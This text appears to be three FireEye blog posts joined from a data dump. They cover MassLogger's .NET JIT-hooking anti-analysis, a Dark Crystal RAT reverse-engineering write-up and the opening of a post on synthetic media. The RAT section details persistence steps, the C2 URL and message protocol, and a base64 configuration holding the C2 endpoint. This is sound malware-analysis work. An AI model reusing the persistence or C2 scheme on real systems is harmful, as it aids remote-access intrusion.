disassembled by dnSpy as shown in Figure 9. Figure 9: Method 0x06000495 in dnSpy IL view .NET Fat Method Coming back to method 0x0600049D (entry number 1181 ) at offset 0x9890 into the file (RVA 0xB690 ), the first byte of the method body is 0x1B (or 0001 1011 in binary). The two least-significant bits are 11 , indicating that 0x0600049D is a fat method. The fat method body header is 12-byte long whose structure is beyond the scope of this blog post. The field we really care about is a four-byte field at offset 0x04 byte into this fat header. This field specifies the length of the MSIL that follows this method body header. For method 0x0600049D , the entire method body header is “ 1B 30 08 00 A8 61 00 00 75 00 00 11 ” and the length of the MSIL to follow is “ A8 61 00 00 ” or 0x61A8 ( 25000 in decimal) bytes. Figure 10: Method 0x0600049D body in a hex editor JIT Compilation Whether a method is tiny or fat, it does not execute as is. When the .NET runtime needs to execute a method, it follows exactly the process described earlier to find the method body which includes the method body header and the MSIL bytes. If this is the first time the method needs to run, the .NET runtime invokes the Just-In-Time compiler which takes the MSIL bytes and compiles them into x86 or x64 assembly depending on whether the current process is 32- or 64-bit. After some preparation, the JIT compiler eventually calls the compileMethod() function. The entire .NET runtime project is open-sourced and available on GitHub . We can easily find out that the compileMethod() function has the following prototype (Figure 11): CorJitResult __stdcall compileMethod ( ICorJitInfo                       *comp,               /* IN */ CORINFO_METHOD_INFO               * info ,               /* IN */ unsigned /* code:CorJitFlag */    flags,               /* IN */ BYTE                              **nativeEntry,       /* OUT */ ULONG                             *nativeSizeOfCode    /* OUT */ ); Figure 11: compileMethod() function protype Figure 12 shows the CORINFO_METHOD_INFO structure. struct CORINFO_METHOD_INFO { CORINFO_METHOD_HANDLE       ftn; CORINFO_MODULE_HANDLE       scope; BYTE * ILCode ; unsigned ILCodeSize ; unsigned                    maxStack; unsigned                    EHcount; CorInfoOptions              options; CorInfoRegionKind           regionKind; CORINFO_SIG_INFO            args; CORINFO_SIG_INFO            locals; }; Figure 12: CORINFO_METHOD_INFO structure The ILCode is a pointer to the MSIL of the method to compile, and the ILCodeSize tells us how long the MSIL is. The return value of compileMethod() is an error code indicating success or failure. In case of success, the nativeEntry pointer is populated with the address of the executable memory region containing the x86 or the x64 instruction that is compiled from the MSIL. MassLogger JIT Hooking Let’s come back to MassLogger. As soon as the main module initialization runs, it first decrypts MSIL of the other methods. It then installs a hook to execute its own version of compileMethod() (method 0x06000499 ). This method replaces the ILCode and ILCodeSize fields of the info argument to the original compileMethod() with the real malware’s MSIL bytes. In addition to replacing the MSIL bytes, MassLogger also patches the method body header at module initialization time. As seen from Figure 13, the method body header of method 0x060003DD on disk (at file offset 0x3CE0) is different from the header in memory (at RVA 0x5AE0 ). The only two things remaining quite consistent are the least significant two bits indicating whether the method is tiny or fat. To successfully defeat this anti-analysis technique, we must recover the real MSIL bytes as well as the correct method body headers. Figure 13: Same method body with different headers when resting on disk vs. loaded in memory Defeating JIT Method Body Replacement With JITM To automatically recover the MSIL and the method body header, one possible approach suggested by another FLARE team member is to install our own hook at compileMethod() function before loading and allowing the MassLogger module constructor to run.  There are multiple tutorials and open-sourced projects on hooking compileMethod() using both managed hooks (the new compileMethod() is a managed method written in C#) and native hooks (the new compileMethod() is native and written in C or C++). However, due to the unique way MassLogger hooks compileMethod() , we cannot use the vtable hooking technique implemented by many of the aforementioned projects. Therefore, I’d like to share the following project: JITM , which is designed use inline hooking implemented by PolyHook library. JITM comes with a wrapper for compileMethod() which logs all the method body headers and MSIL bytes to a JSON file before calling the original compileMethod() . In addition to the hook, JITM also includes a .NET loader. This loader first loads the native hook DLL ( jitmhook.dll ) and installs the hook. The loader then loads the MassLogger payload and executes its entry point. This causes MassLogger’s module initialization code to execute and install its own hook, but hooking jitmhook.dll code instead of the original compileMethod() . An alternative approach to executing MassLogger’s entry point is to call the RuntimeHelpers.PrepareMethod() API to force the JIT compiler to run on all methods. This approach is better because it avoids running the malware, and it potentially can recover methods not called in the sample’s natural code path. However, additional work is required to force all methods to be compiled properly. To load and recover MassLogger methods, first run the following command (Figure 14): jitm.exe Bin-123.exe [optional_timeout] Figure 14: Command to run jitm Once the timeout expires, you should see the files jitm.log and jitm.json created in the current directory. jitm.json contains the method tokens, method body headers and MSIL bytes of all methods recovered from Bin-123.exe . The only thing left to do is to rebuild the .NET metadata so we can perform static analysis. Figure 15: Sample jitm.json Rebuilding the Assembly Since the decrypted method body headers and MSIL bytes may not fit in the original .NET assembly properly, the easiest thing to do is to add a new section and a section header to MassLogger. There are plenty of resources on how to add a PE section header and data , none of which is trivial or easy to automate. Therefore, JITM also include the following Python 2.7 helper script to automate this process: Scripts\\addsection.py . With the method body header and MSIL of each method added to a new PE section as shown in Figure 16, we can easily parse the .NET metadata and fix each method’s RVA to point to the correct method body within the new section. Unfortunately, I did not find any Python library to easily parse the .NET metadata and the MethodDef table. Therefore, JITM also includes a partially implemented .NET metadata parser: Script\\pydnet.py . This script uses pefile and vivisect modules and parses the PE file up to the Method table to extract all methods and their associated RVAs. Figure 16: Bin-123.exe before and after adding an additional section named FLARE Finally, to tie everything together, JITM provides Script\\fix_assembly.py to perform the following tasks: Write the method body header and MSIL of each method recovered in jitm.json into a temporary binary file named “ section.bin ” while at the same time remember the associated method token and the offset into section.bin . Use addsection.py to add section.bin into Bin-123.exe and save the data into a new file, e.g. Bin-123.fixed.exe . Use pydnet.py to parse Bin-123.fixed.exe and update the RVA field of each method entry in the MethodDef table to point to the correct RVA into the new section. The final result is a partially reconstructed .NET assembly. Although additional work is necessary to get this assembly to run correctly, it is good enough to perform static analysis to understand the malware’s high-level functionalities. Let’s look at the reconstructed method 0x0600043E that implements the decryption logic for the malware configuration. Compared to the original MSIL, the reconstructed MSIL now shows that the malware uses AES-256 in CBC mode with PKCS7 padding. With a combination of dynamic analysis and static analysis, we can also easily identify the key to be “ Vewgbprxvhvjktmyxofjvpzgazqszaoo ” and the IV to be part of the Base64 -encoded buffer passed in as its argument. Figure 17: Method 0x0600043 before and after fixing the assembly Armed with that knowledge, we can write a simple tool to decrypt the malware configuration and recover all HBIs and NBIs (Figure 18).

Although this technique is not new, I haven’t seen many .NET malwares making use of it, let alone trying to implement their own adaptation instead of using widely available protectors like ConfuserEx. Hopefully, with this blog post and JITM , analysts will now have the tools and knowledge to defeat MassLogger or any future variants that use a similar technique. If this is the type of work that excites you; and, if you thrive to push the state of the art when it comes to malware analysis and reverse engineering, the Front Line Applied Research and Expertise (FLARE) team may be a good place for you. The FLARE team faces fun and exciting challenges on a daily basis; and we are constantly looking for more team members to tackle these challenges head on.

                "text": "The FireEye Mandiant Threat Intelligence Team helps protect our customers by tracking cyber attackers and the malware they use. The FLARE Team helps augment our threat intelligence by reverse engineering malware samples. Recently, FLARE worked on a new C# variant of Dark Crystal RAT (DCRat) that the threat intel team passed to us. We reviewed open source intelligence and prior work, performed sandbox testing, and reverse engineered the Dark Crystal RAT to review its capabilities and communication protocol. Through publishing this blog post we aim to help defenders look for indicators of compromise and other telltale signs of Dark Crystal RAT, and to assist fellow malware researchers new to .NET malware, or who encounter future variants of this sample. Discovering Dark Crystal RAT The threat intel team provided FLARE with an EXE sample, believed to contain Dark Crystal RAT, and having the MD5 hash b478d340a787b85e086cc951d0696cb1. Using sandbox testing, we found that this sample produced two executables, and in turn, one of those two executables produced three more. Figure 1 shows the relationships between the malicious executables discovered via sandbox testing. Figure 1: The first sample we began analyzing ultimately produced five executables. Armed with the sandbox results, our next step was to perform a triage analysis on each executable. We found that the original sample and mnb.exe were droppers, that dal.exe was a clean-up utility to delete the dropped files, and that daaca.exe and fsdffc.exe were variants of Plurox, a family with existing reporting. Then we moved to analyzing the final dropped sample, which was dfsds.exe. We found brief public reporting by @ James_inthe_box on the same sample, identifying it as DCRat and as a RAT and credential stealer . We also found a public sandbox run that included the same sample. Other public reporting described DCRat, but actually analyzed the daaca.exe Plurox component bundled along with DCRat in the initial sample. Satisfied that dfsds.exe was a RAT lacking detailed public reporting, we decided to perform a deeper analysis. Analyzing Dark Crystal RAT Initial Analysis Shifting aside from our sandbox for a moment, we performed static analysis on dfsds.exe. We chose to begin static analysis using CFF Explorer, a good tool for opening a PE file and breaking down its sections into a form that is easy to view. Having viewed dfsds.exe in CFF Explorer, as shown in Figure 2, the utility showed us that it is a .NET executable. This meant we could take a much different path to analyzing it than we would on a native C or C++ sample. Techniques we might have otherwise used to start narrowing down a native sample’s functionality, such as looking at what DLLs it imports and what functions from those DLLs that it uses, yielded no useful results for this .NET sample. As shown in Figure 3, dfsds.exe imports only the function _CorExeMain from mscoree.dll. We could have opened dfsds.exe in IDA Pro, but IDA Pro is usually not the most effective way of analyzing .NET samples; in fact, the free version of IDA Pro cannot handle .NET Common Language Infrastructure (CLI) intermediate code. Figure 2: CFF Explorer shows that dfsds.exe is a .NET executable. Figure 3: The import table for dfsds.exe is not useful as it contains only one function. Instead of using a disassembler like IDA Pro on dfsds.exe, we used a .NET decompiler. Luckily for the reverse engineer, decompilers operate at a higher level and often produce a close approximation of the original C# code. dnSpy is a great .NET decompiler. dnSpy’s interface displays a hierarchy of the sample’s namespaces and classes in the Assembly Explorer and shows code for the selected class on the right. Upon opening dfsds.exe, dnSpy told us that the sample’s original name at link time was DCRatBuild.exe, and that its entry point is at <PrivateImplementationDetails>{63E52738-38EE-4EC2-999E-1DC99F74E08C}.Main , shown in Figure 4. When we browsed to the Main method using the Assembly Explorer, we found C#-like code representing that method in Figure 5. Wherever dnSpy displays a call to another method in the code, it is possible to click on the target method name to go to it and view its code. By right-clicking on an identifier in the code, and clicking Analyze in the context menu, we caused dnSpy to look for all occurrences where the identifier is used, similar to using cross-references in IDA Pro. Figure 4: dnSpy can help us locate the sample's entry point Figure 5: dnSpy decompiles the Main method into C#-like code We went to the SchemaServerManager.Main method that is called from the entry point method, and observed that it makes many calls to ExporterServerManager.InstantiateIndexer with different integer arguments, as shown in Figure 6. We browsed to the ExporterServerManager.InstantiateIndexer method, and found that it is structured as a giant switch statement with many goto statements and labels; Figure 7 shows an excerpt. This does not look like typical dnSpy output, as dnSpy often reconstructs a close approximation of the original C# code, albeit with the loss of comments and local variable names. This code structure, combined with the fact that the code refers to the CipherMode.CBC constant, led us to believe that ExporterServerManager.InstantiateIndexer may be a decryption or deobfuscation routine. Therefore, dfsds.exe is likely obfuscated. Luckily, .NET developers often use obfuscation tools that are somewhat reversible through automated means. Figure 6: SchemaServerManager.Main makes many calls to ExporterServerManager.InstantiateIndexer Figure 7: ExporterServerManager.InstantiateIndexer looks like it may be a deobfuscation routine Deobfuscation De4dot is a .NET deobfuscator that knows how to undo many types of obfuscations. Running de4dot -d (for detect) on dfsds.exe (Figure 8) informed us that .NET Reactor was used to obfuscate it. > de4dot -d dfsds.exe de4dot v3.1.41592.3405 Copyright (C) 2011-2015 de4dot@gmail.com Latest version and source code: https://github.com/0xd4d/de4dot Detected .NET Reactor (C:\\...\\dfsds.exe) Figure 8: dfsds.exe is obfuscated with .NET Reactor After confirming that de4dot can deobfuscate dfsds.exe, we ran it again to deobfuscate the sample into the file dfsds_deob.exe (Figure 9). > de4dot -f dfsds.exe -o dfsds_deob.exe de4dot v3.1.41592.3405 Copyright (C) 2011-2015 de4dot@gmail.com Latest version and source code: https://github.com/0xd4d/de4dot Detected .NET Reactor (C:\\Users\\user\\Desktop\\intelfirst\\dfsds.exe) Cleaning C:\\Users\\user\\Desktop\\intelfirst\\dfsds.exe Renaming all obfuscated symbols Saving C:\\Users\\user\\Desktop\\intelfirst\\dfsds_deob.exe Figure 9: de4dot successfully deobfuscates dfsds.exe After deobfuscating dfsds.exe, we ran dnSpy again on the resulting dfsds_deob.exe. When we decompiled SchemaServerManager.Main again, the results were much different, as shown in Figure 10. Contrasting the new output with the obfuscated version shown previously in Figure 6, we found the deobfuscated code much more readable. In the deobfuscated version, all the calls to ExporterServerManager.InstantiateIndexer were removed; as suspected, it was apparently a string decoding routine. In contrast, the class names shown in the Assembly Explorer did not change; the obfuscator must have irrecoverably replaced the original class names with meaningless ones obtained from a standard list. Next, we noted that ten lines in Figure 10 hold base64-encoded data. Once the sample was successfully deobfuscated, it was time to move on to extracting its configuration and to follow the sample’s code path to its persistence capabilities and initial beacon. Figure 10: Deobfuscating dfsds.exe shows that the method begins with some path manipulation and then accesses Base64-encoded data Configuration, Persistence and Initial Beacon Recall that in Figure 10 we found that the method SchemaServerManager.Main has a local variable containing Base64-encoded data; decoding that data revealed what it contains. Figure 11 shows the decoded configuration (with C2 endpoint URLs de-fanged): > echo TUhvc3Q6aHR0cDovL2RvbWFsby5vbmxpbmUva3NlemJseGx2b3Uza2NtYnE4bDdoZjNmNGN5NXhnZW 80dWRsYTkxZHVldTNxYTU0LzQ2a3FianZ5a2x1bnAxejU2dHh6a2hlbjdnamNpM2N5eDhnZ2twdHgy NWk3NG1vNm15cXB4OWtsdnYzL2FrY2lpMjM5bXl6b24weHdqbHhxbm4zYjM0dyxCSG9zdDpodHRwOi 8vZG9tYWxvLm9ubGluZS9rc2V6Ymx4bHZvdTNrY21icThsN2hmM2Y0Y3k1eGdlbzR1ZGxhOTFkdWV1 M3FhNTQvNDZrcWJqdnlrbHVucDF6NTZ0eHpraGVuN2dqY2kzY3l4OGdna3B0eDI1aTc0bW82bXlxcH g5a2x2djMvYWtjaWkyMzlteXpvbjB4d2pseHFubjNiMzR3LE1YOkRDUl9NVVRFWC13TGNzOG8xTlZF VXRYeEo5bjl5ZixUQUc6VU5ERUY= | base64 -d MHost:hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/ 46kqbjvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239myzon0xwjl xqnn3b34w,BHost:hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91 dueu3qa54/46kqbjvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239 myzon0xwjlxqnn3b34w,MX:DCR_MUTEX-wLcs8o1NVEUtXxJ9n9yf,TAG:UNDEF Figure 11: Decoding the base64 data in SchemaServerManager.Main reveals a configuration string Figure 11 shows that the data decoded to a configuration string containing four values: MHost, BHost, MX, and TAG. We analyzed the code that parses this string and found that MHost and BHost were used as its main and backup command and control (C2) endpoints. Observe that the MHost and BHost values in Figure 11 are identical, so this sample did not have a backup C2 endpoint. In dnSpy it is possible to give classes and methods meaningful names just as it is possible to name identifiers in IDA Pro. For example, the method SchemaServerManager.StopCustomer picks the name of a random running process. By right-clicking the StopCustomer identifier and choosing Edit Method, it is possible to change the method name to PickRandomProcessName , as shown in Figure 12. Figure 12: Assigning meaningful names to methods makes it easier to keep analyzing the program Continuing to analyze the SchemaServerManager.Main method revealed that the sample persists across reboots. The persistence algorithm can be summarized as follows: The malware picks the name of a random running process, and then copies itself to %APPDATA% and C:\\ . For example, if svchost.exe is selected, then the malware copies itself to %APPDATA%\\svchost.exe and C:\\svchost.exe . The malware creates a shortcut %APPDATA%\\dotNET.lnk pointing to the copy of the malware under %APPDATA% . The malware creates a shortcut named dotNET.lnk in the logged-on user’s Startup folder pointing to %APPDATA%\\dotNET.lnk . The malware creates a shortcut C:\\Sysdll32.lnk pointing to the copy of the malware under C:\\ . The malware creates a shortcut named Sysdll32.lnk in the logged-on user’s Startup folder pointing to C:\\Sysdll32.lnk . The malware creates the registry value HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\scrss pointing to %APPDATA%\\dotNET.lnk . The malware creates the registry value HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Wininit pointing to C:\\Sysdll32.lnk . After its persistence steps, the malware checks for multiple instances of the malware: The malware sleeps for a random interval between 5 and 7 seconds. The malware takes the MD5 hash of the still-base64-encoded configuration string, and creates the mutex whose name is the hexadecimal representation of that hash. For this sample, the malware creates the mutex bc2dc004028c4f0303f5e49984983352 . If this fails because another instance is running, the malware exits. The malware then beacons, which also allows it to determine whether to use the main host (MHost) or backup host (BHost). To do so, the malware constructs a beacon URL based on the MHost URL, makes a request to the beacon URL, and then checks to see if the server responds with the HTTP response body “ok.” If the server does not send this response, then the malware unconditionally uses the BHost; this code is shown in Figure 13. Note that since this sample has the same MHost and BHost value (from Figure 11), the malware uses the same C2 endpoint regardless of whether the check succeeds or fails. Figure 13: The malware makes an HTTP request based on the MHost URL to determine whether to use the MHost or BHost The full algorithm to obtain the beacon URL is as follows: Obtain the MHost URL, i.e., hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54 /46kqbjvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239my zon0xwjlxqnn3b34w . Calculate the SHA1 hash of the full MHost URL, i.e., 56743785cf97084d3a49a8bf0956f2c744a4a3e0. Remove the last path component from the MHost URL, and then append the SHA1 hash from above, and ?data=active. The full beacon URL is therefore hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54 /46kqbjvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/56743785cf 97084d3a49a8bf0956f2c744a4a3e0.php?data=active . After beaconing the malware proceeds to send and receive messages with the configured C2. Messages and Capabilities After performing static analysis of dfsds.exe to determine how it selects the C2 endpoint and confirming the C2 endpoint URL, we shifted to dynamic analysis in order to collect sample C2 traffic and make it easier to understand the code that generates and accepts C2 messages. Luckily for our analysis, the malware continues to generate requests to the C2 endpoint even if the server does not send a valid response. To listen for and intercept requests to the C2 endpoint (domalo[.]online) without allowing the malware Internet access, we used FLARE’s FakeNet-NG tool . Figure 14 shows some of the C2 requests that the malware made being captured by FakeNet-NG. Figure 14: FakeNet-NG can capture the malware's HTTP requests to the C2 endpoint By comparing the messages generated by the malware and captured in FakeNet-NG with the malware’s decompiled code, we determined its message format and types. Observe that the last HTTP request visible in Figure 14 contains a list of running processes. By tracing through the decompiled code, we found that the method SchemaServerManager.ObserverWatcher.NewMerchant generated this message. We renamed this method to taskThread and assigned meaningful names to the other methods it calls; the resulting code for this method appears in Figure 15. Figure 15: The method that generates the list of running processes and sends it to the C2 endpoint By analyzing the code further, we identified the components of the URLs that the malware used to send data to the C2 endpoint, and how they are constructed. Beacons The first type of URL is a beacon, sent only once when the malware starts up. For this sample, the beacon URL was always hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/46kqbjvyklunp1z56txzk hen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/<hash>.php?data=active, where <hash> is the SHA1 hash of the MHost URL, as described earlier. GET requests, format 1 When the malware needs to send data to or receive data from the C2, it sends a message. The first type of message, which we denote as “format 1,” is a GET request to URLs of the form hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/46kqb jvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239myzon0xwjlxqnn 3b34w/ <hash> .php? type=__ds_setdata&__ds_setdata_user= <user_hash> &__ds_setdata_ext= <message_hash> &__ds_setdata_data= <message> , where: <hash> is MD5(SHA1(MHost)) , which for this sample, is 212bad81b4208a2b412dfca05f1d9fa7 . <user_hash> is a unique identifier for the machine on which the malware is running. It is always calculated as SHA1(OS_version + machine_name + user_name) as provided by the .NET System.Environment class. <message_hash> identifies what kind of message the malware is sending to the C2 endpoint. The <message_hash> is calculated as MD5(<message_type> + <user_hash>) , where <message_type> is a short keyword identifying the type of message, and <user_hash> is as calculated above. Values for <message_type> exist for each command that the malware supports; for possible values, see the “msgs” variable in the code sample shown in Figure 19. Observe that this makes it difficult to observe the message type visually from log traffic, or to write a static network signature for the message type, since it varies for every machine due to the inclusion of the <user_hash> . One type of message uses the value u instead of a hash for <message_hash> . <message> is the message data, which is not obscured in any way. The other type of ordinary message is a getdata message. These are GET requests to URLs of the form hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/46kqb jvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239myzon0xwjlxqnn 3b34w/ <hash> .php? type=__ds_getdata&__ds_getdata_user= <user_hash> &__ds_getdata_ext= <message_hash> &__ds_getdata_key= <key> , where: <hash> and <user_hash> are calculated as described above for getdata messages. <message_hash> is also calculated as described above for getdata messages, but describes the type of message the malware is expecting to receive in the server’s response. <key> is MD5(<user_hash>) . The server is expected to respond to a getdata message with an appropriate response for the type of message specified by <message_hash> . GET requests, format 2 A few types of messages from the malware to the C2 use a different format, which we denote as “format 2.” These messages are GET requests of the form hxxp://domalo[.]online /ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/46kqbjvyklunp1z56txzkhen7gj ci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239myzon0xwjlxqnn3b34w/ <user_hash> . <mes sage_hash> , where: <user_hash> is calculated as described above for getdata messages. <message_hash> is also calculated as described above for getdata messages, but describes the type of message the malware is expecting to receive in the server’s response. <message_hash> may also be the string comm . Table 1 shows possible <message_types> that may be incorporated into <message_hash> as part of format 2 messages to instruct the server which type of response is desired. In contrast to format 1 messages, format 2 messages are only used for a handful of <message_type> values. <message_type> Response desired s_comm The server sends a non-empty response if a screenshot request is pending m_comm The server sends a non-empty response if a microphone request is pending RDK The server responds directly with keystrokes to replay comm The server responds directly with other types of tasking Table 1: Message types when the malware uses a special message to request tasking from the server POST requests When the malware needs to upload large files, it makes a POST request. These POST requests are sent to hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/46kqb jvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239myzon0xwjlxqnn 3b34w/<hash>.php , with the following parameters in the POST data: name is <user_hash> + \".\" + <message_type> , where <user_hash> is calculated as described above and <message_type> is the type of data being uploaded. upload is a file with the data being sent to the server. Table 2 shows possible <message_type> values along with the type of file being uploaded. <message_type> Type of File jpg Screenshot zipstealerlog Cookie stealer log wav Microphone recording file Uploaded file bmp Webcam image RD.jpg Remote control screenshot Table 2: Message types when files are uploaded to the server Capabilities By analyzing the code that handles the responses to the comm message (format 2), it was possible for us to inventory the malware’s capabilities. Table 3 shows the keywords used in responses along with the description of each capability.

Here is a code snippet that we wrote containing a barebones DCRat server written in Python . Unlike a real RAT server, this one does not have a user interface to allow the attacker to pick and launch commands. Instead, it has a pre-scripted command list that it sends to the RAT. When the server starts up, it uses the Python BaseHTTPServer to begin listening for incoming web requests (lines 166-174). Incoming POST requests are assumed to hold a file that the RAT is uploading to the server; this server assumes all file uploads are screenshots and saves them to “screen.png” (lines 140-155). For GET requests, the server must distinguish between beacons, ordinary messages, and special messages (lines 123-138). For ordinary messages, __ds_setdata messages are simply printed to standard output, while the only __ds_getdata message type supported is s_comm (screenshot communications), to which the server responds with the desired screenshot dimensions (lines 63-84). For messages of type comm, the server sends four types of commands in sequence: first, it hides the desktop icons; then, it causes the string “Hello this is tech support” to be spoken; next, it displays a message box asking for a password; finally, it launches the Windows Calculator (lines 86-121). Figure 16 shows the results when Dark Crystal RAT is run on a system that has been configured to redirect all traffic to domalo[.]online to the proof-of-concept server we wrote. Figure 16: The results when a Dark Crystal RAT instance communicates with the proof-of-concept server Other Work and Reconnaissance After reverse engineering Dark Crystal RAT, we continued reconnaissance to see what additional information we could find. One limitation to our analysis was that we did not wish to allow the sample to communicate with the real C2, so we kept it isolated from the Internet. To learn more about Dark Crystal RAT we tried two approaches: the first was to browse the Dark Crystal RAT website (files.dcrat[.]ru) using Tor, and the other was to take a look at YouTube videos of others’ experiments with the “real” Dark Crystal RAT server. Dark Crystal RAT Website We found that Dark Crystal RAT has a website at files.dcrat[.]ru, shown in Figure 17. Observe that there are options to download the RAT itself, as well as a few plugins; the DCLIB extension is consistent with the plugin loading code we found in the RAT. Figure 17: The website files.dcrat[.]ru allows users to download Dark Crystal RAT and some of its plugins Figure 18 shows some additional plugins, including plugins with the ability to resist running in a virtual machine, disable Windows Defender, and disable webcam lights on certain models. No plugins were bundled with the sample we studied. Figure 18: Additional plugins listed on the Dark Crystal RAT website Figure 19 lists software downloads on the RAT page. We took some time to look at these files; here are some interesting things we discovered: The DCRat listed on the website is actually a “builder” that packages a build of the RAT and a configuration for the attacker to deploy. This is consistent with the name DCRatBuild.exe shown back in Figure 4. In our brief testing of the builder, we found that it had a licensing check. We did not pursue bypassing it once we found public YouTube videos of the DCRat builder in operation, as we show later. The DarkCrystalServer is not self-contained, rather, it is just a PHP file that allows the user to supply a username and password, which causes it to download and install the server software. Due to the need to supply credentials and communicate back with dcrat[.]ru (Figure 20), we did not pursue further analysis of DarkCrystalServer. Figure 19: The RAT page lists software for the RAT, the server, an API, and plugin development Figure 20: The DarkCrystalServer asks for a username and password and calls back to dcrat[.]ru to download software, so we did not pursue it further YouTube Videos As part of confirming our findings about Dark Crystal RAT capabilities that we obtained through reverse engineering, we found some YouTube demonstrations of the DCRat builder and server. The YouTube user LIKAR has a YouTube demonstration of Dark Crystal RAT . The author demonstrates use of the Dark Crystal RAT software on a server with two active RAT instances. During the video, the author browses through the various screens in the software. This made it easy to envision how a cyber threat would use the RAT, and to confirm our suspicions of how it works. Figure 21 shows a capture from the video at 3:27 . Note that the Dark Crystal RAT builder software refers to the DCRatBuild package as a “server” rather than a client. Nonetheless, observe that one of the options was a type of Java, or C# (Beta). By watching this YouTube video and doing some additional background research, we discovered that Dark Crystal RAT has existed for some time in a Java version. The C# version is relatively new. This explained why we could not find much detailed prior reporting about it. Figure 21: A YouTube demonstration revealed that Dark Crystal RAT previously existed in a Java version, and the C# version we analyzed is in beta Figure 22 shows another capture from the video at 6:28. The functionality displayed on the screen lines up nicely with the “msgbox”, “browseurl”, “clipboard”, “speak”, “opencd”, “closecd”, and other capabilities we discovered and enumerated in Table 6. Figure 22: A YouTube demonstration confirmed many of the Dark Crystal RAT capabilities we found in reverse engineering Conclusion In this post we walked through our analysis of the sample that the threat intel team provided to us and all its components. Through our initial triage, we found that its “dfsds.exe” component is Dark Crystal RAT. We found that Dark Crystal RAT was a .NET executable, and reverse engineered it. We extracted the malware’s configuration, and through dynamic analysis discovered the syntax of its C2 communications. We implemented a small proof-of-concept server to test the correct format of commands that can be sent to the malware, and how to interpret its uploaded screenshots. Finally, we took a second look at how actual threat actors would download and use Dark Crystal RAT. To conclude, indicators of compromise for this version of Dark Crystal RAT (MD5: 047af34af65efd5c6ee38eb7ad100a01) are given in Table 4.

                "text": "FireEye’s Data Science and Information Operations Analysis teams released this blog post to coincide with our Black Hat USA 2020 Briefing , which details how open source, pre-trained neural networks can be leveraged to generate synthetic media for malicious purposes. To summarize our presentation, we first demonstrate three successive proof of concepts for how machine learning models can be fine-tuned in order to generate customizable synthetic media in the text, image, and audio domains. Next, we illustrate examples in which synthetically generated media have been weaponized for information operations (IO), as detected on the front lines by Mandiant Threat Intelligence. Finally, we outline challenges in detecting synthetically generated content, and lay out potential paths forward in a future where synthetically generated media will increasingly look, speak, and write like us. Highlights Open source, pre-trained natural language processing, computer vision, and speech recognition neural networks can be weaponized for offensive social media-driven IO campaigns. Detection, attribution, and response is challenging in scenarios where actors can anonymously generate and distribute credible fake content using proprietary training datasets. The security community can and should help AI researchers, policy makers, and other stakeholders mitigate the harmful use of open source models. Background: Synthetic Media, Generative Models, and Transfer Learning Synthetic media is by no means a new development; methods for manipulating media for specific agendas are as old as the media themselves. In the 1930’s, the chief of the Soviet secret police was photographed walking alongside Joseph Stalin before being retouched out of an official press photo, after he himself was arrested and executed during the Great Purge . Digital graphic manipulation like this became prominent with the advent of Photoshop. Then later in the 2010’s, the term “deepfake” was coined. While deepfake videos, including techniques like face swapping and lip syncing, are concerning in the long term, this blog post focuses on more basic, but we argue more believable, synthetic media generation advancements in the text, static image, and audio domains. Machine learning approaches for creating synthetic media are underpinned by generative models, which have been effectively misused to fabricate high volume submissions to federal public comment websites and clone a voice to trick an executive into handing over $240,000 . The pre-training required to produce models capable of synthetic media generation can cost thousands of dollars, take weeks or months of time, and require access to expensive GPU clusters. However, the application of transfer learning can drastically reduce the amount of time and effort involved. In transfer learning, we start from a large generic model that has been pre-trained for an initial task where copious data is available. We then leverage the model’s acquired knowledge to train it further on a different, smaller dataset so that it excels at a subsequent, related task. This process of training the model further is referred to as fine-tuning , which typically requires less resources compared to pre-training from scratch. You can think of this in more relatable terms—if you’re a professional tennis player, you don’t need to completely relearn how to swing a racket in order to excel at badminton. In practice though, the benefits of transfer learning are only\nrealized when people share their pre-trained models. As illustrated by\nFigure 1, it turns out that it’s commonplace for well-resourced\nindustry and academic researchers to release their model checkpoints\nwhen their state of the art (SOTA) work gets accepted into a top-tier\nconference. Code is typically released in the form of GitHub\nrepositories with extensive HOWTO guides and well-documented READMEs.\nThis allows anyone to easily reproduce figures from the initial\npapers, and potentially use this source code as a starting point for\ntheir own research or projects. This process plays out on loop,\nensuring a healthy, self-reinforcing model supply chain and ultimately\na quicker pace of scientific innovation. However, while this emergent\nmodel sharing ecosystem beneficially lowers the barrier to entry for\nnon-experts, it also gives a leg up to those seeking to leverage open\nsource models for malicious purposes. Just how much has this barrier to entry been lowered though?\nFine-tuning can be performed in a fraction of the time, cost, data\nsize, and compute compared to training models from scratch. Whether\nit's a cloud hosted notebook with GPU access, or a cloud GPU instance\nreservation for just a single day, we're talking on the order of just\ntens of dollars to fine-tune one of these models. Skill-wise,\nfine-tuning is not necessarily trivial, but it’s also not “brain\nsurgery”—authors or other open source contributors often release\nadditional code and tutorials for how to fine-tune. The pre-trained models covered here were each released just within\nthe last year, so the demonstrations in the next section should be\nseen through the lens of the present moment in time. However, open\nsource releases are accelerating, and the bar for generating credible\nsynthetic content will likely lower even further in the years to come. See No Evil As a first proof of concept, we’ll demonstrate how StyleGAN2 